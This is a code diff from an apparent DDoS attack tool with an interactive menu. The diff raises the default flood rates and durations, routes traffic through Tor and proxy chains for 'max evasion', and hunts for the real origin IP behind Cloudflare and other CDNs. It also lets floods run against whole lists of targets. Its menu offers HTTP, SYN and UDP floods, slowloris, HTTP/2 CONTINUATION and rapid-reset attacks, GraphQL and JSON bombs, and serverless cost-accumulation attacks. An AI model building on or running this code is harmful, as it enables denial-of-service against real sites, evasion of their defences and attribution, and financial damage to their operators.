-    print_attack_summary(target, duration, total)
+    await asyncio.sleep(0.5)
+    dash.stop()
+    print_attack_summary(target, duration, agg)
 
 async def run_auto_mode(target: str, cfg: dict):
     """
@@ -1671,16 +2440,110 @@ async def run_auto_mode(target: str, cfg: dict):
             except Exception as e:
                 _RICH_CONSOLE.print(f"[bold yellow][!][/] FlareSolverr init error: {e}")
     
-    duration = int(get_input(" Duration (seconds, default 120): ") or "120")
-    target_rps = int(get_input(" Target RPS (default 2000): ") or "2000")
-    
-    # Optional proxy pool
-    use_proxy_prompt = get_input(" Use proxy pool? (y/N): ").strip().lower() == "y"
+    duration = int(get_input(" Duration (seconds, default 600): ") or "600")
+    target_rps = int(get_input(" Target RPS (default 8000): ") or "8000")
+
+    # Unified attack mode menu (replaces messy Tor + proxy chains)
+    print()
+    print(f" {c('c','[*]')} Attack mode:")
+    print(f"   {c('c','[1]')} Direct (origin IP only, no Tor / no proxy) {c('g','[fastest]')}")
+    print(f"   {c('c','[2]')} Tor network (auto-rotate exit nodes for CF bypass) {c('g','[recommended]')}")
+    print(f"   {c('c','[3]')} Proxy pool (load proxies/*.txt, validate, rotate)")
+    print(f"   {c('c','[4]')} Tor + Proxy (BOTH - max evasion)")
+    mode = (get_input(" Choose [1/2/3/4] (default 2): ").strip() or "2")
+
+    use_tor = mode in ("2", "4")
+    use_proxy = mode in ("3", "4")
+    tor_instances = 0
     proxy_pool = None
-    if use_proxy_prompt:
+    origin_ip: Optional[str] = None
+
+    # Origin IP prompt (CF bypass) - applies to all modes
+    parsed = urlparse(target)
+    hostname = parsed.hostname or ""
+    print(f" {c('c','[*]')} Target type: domain/URL ({hostname})")
+
+    # Try saved origin first
+    try:
+        from core.recon.origin.origin_store import load_hunt, get_best_origin
+        saved = load_hunt(target)
+        if saved and (saved.get("verified_origins") or saved.get("candidates")):
+            best = get_best_origin(target)
+            if best:
+                print(f" {c('g','[+]')} Found saved origin IP: {c('w', best)}")
+                if get_input(f"   Use saved origin for bypass? (Y/n): ").lower() != "n":
+                    origin_ip = best
+    except Exception:
+        pass
+
+    if not origin_ip:
+        if get_input(" Auto-find origin IP for bypass? (y/N): ").lower() == "y":
+            from core.recon.origin.origin_hunter import OriginHunter
+
+            # PRE-CHECK: Is target actually behind a CDN?
+            cdn_detected = False
+            direct_ip = None
+            try:
+                import socket as _socket
+                loop = asyncio.get_event_loop()
+                direct_ip = await loop.run_in_executor(None, _socket.gethostbyname, hostname)
+            except Exception:
+                pass
+            try:
+                import requests as _req
+                probe = await loop.run_in_executor(
+                    None,
+                    lambda: _req.head(target, timeout=5, allow_redirects=False,
+                                      headers={"User-Agent": "Mozilla/5.0"})
+                )
+                srv = (probe.headers.get("Server") or "").lower()
+                cdn_markers = ("cloudflare", "akamai", "fastly", "cloudfront",
+                               "imperva", "incapsula", "sucuri")
+                cdn_detected = (
+                    "cf-ray" in {k.lower() for k in probe.headers.keys()}
+                    or any(m in srv for m in cdn_markers)
+                )
+            except Exception:
+                pass
+
+            if not cdn_detected and direct_ip:
+                origin_ip = direct_ip
+                print(f" {c('g','[+]')} No CDN detected — using DNS origin: {c('w', direct_ip)}")
+            else:
+                if cdn_detected:
+                    print(f" {c('c','[*]')} CDN detected — hunting real origin IP...")
+                else:
+                    print(f" {c('c','[*]')} Hunting origin IP...")
+                hunter = OriginHunter(timeout=8)
+                try:
+                    report = await asyncio.wait_for(hunter.hunt(target, env=env), timeout=45)
+                    if report.verified_origins:
+                        origin_ip = report.verified_origins[0]
+                        print(f" {c('g','[+]')} Origin found: {origin_ip}")
+                    elif report.candidates:
+                        origin_ip = report.candidates[0].ip
+                        print(f" {c('y','[*]')} Best candidate: {origin_ip}")
+                    elif direct_ip:
+                        origin_ip = direct_ip
+                        print(f" {c('y','[*]')} Falling back to DNS origin: {direct_ip}")
+                    else:
+                        print(f" {c('y','[!]')} No origin found - hitting target directly")
+                except asyncio.TimeoutError:
+                    if direct_ip:
+                        origin_ip = direct_ip
+                        print(f" {c('y','[!]')} Origin hunt timed out - using DNS origin: {direct_ip}")
+                    else:
+                        print(f" {c('y','[!]')} Origin hunt timed out - hitting target directly")
+
+    if use_tor:
+        tor_input = get_input(" Tor instances (default 15): ").strip()
+        tor_instances = max(3, int(tor_input)) if tor_input.isdigit() else 15
+    if use_proxy:
         try:
             opts = await prompt_attack_options(target, ask_proxy=True, ask_origin=False)
             proxy_pool = opts.get("proxy_pool")
+            if proxy_pool is None:
+                _RICH_CONSOLE.print(f"[bold yellow][!][/] No proxy pool loaded - falling back to direct mode")
         except Exception as e:
             _RICH_CONSOLE.print(f"[bold yellow][!][/] proxy setup failed: {e}")
     
@@ -1723,9 +2586,12 @@ async def run_auto_mode(target: str, cfg: dict):
     info_table.add_column("Key", style="bold white")
     info_table.add_column("Value")
     info_table.add_row("Target", f"[cyan]{target}[/]")
+    info_table.add_row("Origin IP", f"[{'green' if origin_ip else 'red'}]{origin_ip or 'auto-discover'}[/]")
     info_table.add_row("Duration", f"{duration}s")
     info_table.add_row("Peak RPS", f"{target_rps}")
-    info_table.add_row("Engine", "raw_http11 (thread-isolated)")
+    info_table.add_row("Engine", "auto (adaptive)")
+    info_table.add_row("Tor", f"[{'green' if tor_instances > 0 else 'red'}]{tor_instances} instances" if tor_instances > 0 else "[red]OFF[/]")
+    info_table.add_row("Proxy Pool", f"[{'green' if proxy_pool else 'red'}]{len(proxy_pool) if proxy_pool else 'None'}[/]")
     info_table.add_row("HTTP/2", f"[{'green' if bypass.get('http2_impersonation') else 'red'}]{'ON' if bypass.get('http2_impersonation') else 'OFF'}[/]")
     info_table.add_row("WAF Bypass", f"[{'green' if bypass.get('waf_parsing_bypass') else 'red'}]{'ON' if bypass.get('waf_parsing_bypass') else 'OFF'}[/]")
     info_table.add_row("Behavioral", f"[{'green' if bypass.get('behavioral_evasion') else 'red'}]{'ON' if bypass.get('behavioral_evasion') else 'OFF'}[/]")
@@ -1766,6 +2632,8 @@ async def run_auto_mode(target: str, cfg: dict):
             config_path="config/auto_mode.json",
             proxy_pool=proxy_pool,
             cf_cookies=cf_cookies,
+            tor_instances=tor_instances,
+            origin_ip=origin_ip,
         )
         print_auto_mode_v2_summary(result)
         return
@@ -2201,6 +3069,33 @@ async def run_dashboard(target: str, cfg: dict):
     except ImportError as e:
         print(f" {c('r','[-]')} Dashboard module not available: {e}")
 
+async def _module_dispatch(module_func, multi_func, cfg, label="Target URL"):
+    """Dispatch to single-target or multi-target module function."""
+    print()
+    raw = get_input(f" {label} ([1] enter manual, [2] target/target.txt, [ENTER] single): ").strip()
+    if raw == "2":
+        targets = load_target_lines()
+        if not targets:
+            print(f"  {c('r','[-]')} target/target.txt not found or empty")
+            return False
+        print(f"  {c('g','[+]')} {len(targets)} targets loaded:")
+        for i, t in enumerate(targets, 1):
+            print(f"      {i:2d}. {c('w',t)}")
+        if multi_func:
+            await multi_func(targets, cfg)
+        else:
+            for t in targets:
+                await module_func(t, cfg)
+        return True
+    else:
+        t = get_input(f" {label}: ").strip()
+        if not t:
+            return False
+        if label != "Target IP/Host" and not t.startswith(("http://", "https://")):
+            t = "https://" + t
+        await module_func(t, cfg)
+        return True
+
 async def cmd_menu(cfg):
     env = load_env()
     global BYPASS_FLAGS
@@ -2216,112 +3111,80 @@ async def cmd_menu(cfg):
         choice = _RICH_CONSOLE.input("[bold cyan]mpc-layer[/bold cyan][bold white]@[/bold white][bold yellow]v6.0[/bold yellow][bold white] >[/bold white] ").strip().upper()
         if choice == "0":
             await run_dashboard("", cfg)
+            get_input(" Press Enter to continue...")
         elif choice == "1":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_http_flood(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_http_flood, run_http_flood_multi, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "2":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_http2_flood(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_http2_flood, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "3":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_rapid_reset(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_rapid_reset, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "4":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_slowloris(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_slowloris, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "5":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_proxy_flood(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_proxy_flood, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "6":
-            target = get_input(" Target IP/Host: ")
-            if not target: continue
-            await run_syn_flood(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_syn_flood, None, cfg, label="Target IP/Host"):
+                get_input(" Press Enter to continue...")
         elif choice == "7":
-            target = get_input(" Target IP/Host: ")
-            if not target: continue
-            await run_udp_flood(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_udp_flood, None, cfg, label="Target IP/Host"):
+                get_input(" Press Enter to continue...")
         elif choice == "8":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_mixed_attack(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_mixed_attack, run_mixed_attack_multi, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "9":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_auto_mode(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_auto_mode, run_auto_mode_multi, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "N":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_2026(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_advanced_2026, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "L":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_business_logic_attack(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_business_logic_attack, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "K":
-            target = get_input(" Target Domain: ")
-            if not target: continue
-            await run_seo_attack(target, cfg)
-            get_input(" Press Enter to continue...")
+            if await _module_dispatch(run_seo_attack, None, cfg, label="Target Domain"):
+                get_input(" Press Enter to continue...")
         # Advanced 2027 attacks
         elif choice == "A":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "cache-bypass", "Cache-Bypass POST Flood")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "cache-bypass", "Cache-Bypass POST Flood")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "B":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "smuggling", "HTTP Request Smuggling")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "smuggling", "HTTP Request Smuggling")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "C":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "hpack-bomb", "HPACK Compression Bomb")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "hpack-bomb", "HPACK Compression Bomb")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "D":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "continuation", "CONTINUATION Flood (CVE-2024-27316)")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "continuation", "CONTINUATION Flood (CVE-2024-27316)")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "E":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "settings-flood", "HTTP/2 SETTINGS Flood")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "settings-flood", "HTTP/2 SETTINGS Flood")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "F":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "tls-reneg", "TLS Renegotiation Flood")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "tls-reneg", "TLS Renegotiation Flood")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "G":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "post-bomb", "POST Body Bomb (50MB)")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "post-bomb", "POST Body Bomb (50MB)")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "I":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "ws-storm", "WebSocket Connection Storm")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "ws-storm", "WebSocket Connection Storm")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         elif choice == "J":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_advanced_attack(target, cfg, "conn-flood", "TCP Connection Storm")
-            get_input(" Press Enter to continue...")
+            f = lambda t, c: run_advanced_attack(t, c, "conn-flood", "TCP Connection Storm")
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         # Intelligent tools
         elif choice == "H":
             target = get_input(" Target URL: ")
@@ -2335,58 +3198,33 @@ async def cmd_menu(cfg):
         elif choice == "M":
             toggle_bypass_features()
         # QUIC/HTTP/3 next-gen
-        elif choice == "Q":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_quic_attack(target, cfg, "quic-stream-hijack", "HTTP/3 Stream Hijack")
-            get_input(" Press Enter to continue...")
-        elif choice == "R":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_quic_attack(target, cfg, "quic-cid-flood", "QUIC Connection ID Flood")
-            get_input(" Press Enter to continue...")
-        elif choice == "S":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_quic_attack(target, cfg, "quic-crypto-exhaust", "QUIC Crypto Handshake Exhaustion")
-            get_input(" Press Enter to continue...")
+        elif choice in ("Q","R","S"):
+            qmap = {"Q": ("quic-stream-hijack", "HTTP/3 Stream Hijack"),
+                    "R": ("quic-cid-flood", "QUIC Connection ID Flood"),
+                    "S": ("quic-crypto-exhaust", "QUIC Crypto Handshake Exhaustion")}
+            method, label = qmap[choice]
+            f = lambda t, c: run_quic_attack(t, c, method, label)
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         # API Architecture attacks
-        elif choice == "T":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_api_attack(target, cfg, "api_rest_flood", "REST API Flood")
-            get_input(" Press Enter to continue...")
-        elif choice == "U":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_api_attack(target, cfg, "graphql_deep", "GraphQL Deep Nesting")
-            get_input(" Press Enter to continue...")
-        elif choice == "V":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_api_attack(target, cfg, "graphql_alias_bomb", "GraphQL Alias/Fragment Bomb")
-            get_input(" Press Enter to continue...")
-        elif choice == "W":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_api_attack(target, cfg, "grpc_flood", "gRPC Connection Flood")
-            get_input(" Press Enter to continue...")
-        elif choice == "X":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_api_attack(target, cfg, "json_bomb", "JSON/XML Parsing Bomb")
-            get_input(" Press Enter to continue...")
+        elif choice in ("T","U","V","W","X"):
+            amap = {"T": ("api_rest_flood", "REST API Flood"),
+                    "U": ("graphql_deep", "GraphQL Deep Nesting"),
+                    "V": ("graphql_alias_bomb", "GraphQL Alias/Fragment Bomb"),
+                    "W": ("grpc_flood", "gRPC Connection Flood"),
+                    "X": ("json_bomb", "JSON/XML Parsing Bomb")}
+            method, label = amap[choice]
+            f = lambda t, c: run_api_attack(t, c, method, label)
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         # Serverless / DoW
-        elif choice == "Y":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_dow_attack(target, cfg, "cold_start", "Serverless Cold Start Flood")
-            get_input(" Press Enter to continue...")
-        elif choice == "Z":
-            target = get_input(" Target URL: ")
-            if not target: continue
-            await run_dow_attack(target, cfg, "cost_accum", "Serverless Cost Accumulation (DoW)")
-            get_input(" Press Enter to continue...")
+        elif choice in ("Y","Z"):
+            dmap = {"Y": ("cold_start", "Serverless Cold Start Flood"),
+                    "Z": ("cost_accum", "Serverless Cost Accumulation (DoW)")}
+            method, label = dmap[choice]
+            f = lambda t, c: run_dow_attack(t, c, method, label)
+            if await _module_dispatch(f, None, cfg):
+                get_input(" Press Enter to continue...")
         else:
             print(f" {c('r','[-]')} Invalid option.")
 
